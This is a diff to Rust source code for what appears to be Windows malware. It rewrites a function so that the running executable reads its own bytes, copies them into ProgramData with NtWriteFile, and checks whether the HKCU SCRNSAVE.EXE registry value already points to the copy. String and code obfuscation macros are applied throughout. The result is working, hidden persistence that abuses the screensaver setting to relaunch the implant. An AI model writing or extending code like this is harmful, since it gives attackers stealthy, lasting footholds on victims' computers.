@@ -120,7 +120,73 @@ unsafe fn set_screensaver_registry(file_path: &str) -> Result<(), String> {
 
 #[cfg(windows)]
 #[obfuscate(garbage = true)]
-pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
+pub unsafe fn persist() -> Result<(), String> {
+    // Check if the screensaver is already set and the file exists
+    let desktop_key_path: Vec<u16> = OsStr::new("Control Panel\\Desktop")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    let scrnsave_name: Vec<u16> = OsStr::new("SCRNSAVE.EXE")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+
+    let mut hkey_read = mem::MaybeUninit::uninit();
+    if RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        desktop_key_path.as_ptr(),
+        0,
+        KEY_READ,
+        hkey_read.as_mut_ptr(),
+    ) == 0
+    {
+        let hkey_read = hkey_read.assume_init();
+        let mut data_type = mem::MaybeUninit::uninit();
+        let mut data_size = 0;
+
+        if RegQueryValueExW(
+            hkey_read,
+            scrnsave_name.as_ptr(),
+            ptr::null_mut(),
+            data_type.as_mut_ptr(),
+            ptr::null_mut(),
+            &mut data_size,
+        ) == 0 && data_type.assume_init() == REG_SZ
+        {
+            let mut data_buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
+            if RegQueryValueExW(
+                hkey_read,
+                scrnsave_name.as_ptr(),
+                ptr::null_mut(),
+                ptr::null_mut(),
+                data_buffer.as_mut_ptr() as *mut u8,
+                &mut data_size,
+            ) == 0
+            {
+                let end = data_buffer.iter().position(|&x| x == 0).unwrap_or(data_buffer.len());
+                let path_str = String::from_utf16_lossy(&data_buffer[..end]);
+                if Path::new(&path_str).exists() {
+                    RegCloseKey(hkey_read);
+                    return Ok(()); // Already persisted
+                }
+            }
+        }
+        RegCloseKey(hkey_read);
+    }
+
+    // Get the path of the current executable
+    let current_exe_path = match std::env::current_exe() {
+        Ok(path) => path,
+        Err(e) => return Err(format!("Failed to get current executable path: {}", e)),
+    };
+
+    // Read the content of the current executable
+    let exe_content = match fs::read(&current_exe_path) {
+        Ok(content) => content,
+        Err(e) => return Err(format!("Failed to read current executable: {}", e)),
+    };
+
+
     let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
         Ok(s) => s,
         Err(_) => {
@@ -206,8 +272,8 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
         ptr::null_mut(),
         ptr::null_mut(),
         &mut io_status_block,
-        payload_data.as_ptr() as *mut std::ffi::c_void,
-        payload_data.len() as u32,
+        exe_content.as_ptr() as *mut std::ffi::c_void,
+        exe_content.len() as u32,
         ptr::null_mut(),
         ptr::null_mut(),
     );
@@ -220,7 +286,7 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
             obfuscate_string!("NtWriteFile failed with status: "),
             write_status
         ));
-    } else if io_status_block.information != payload_data.len() {
+    } else if io_status_block.information != exe_content.len() {
         result = Err(obfuscate_string!("NtWriteFile wrote incomplete data.").to_string());
     }
 
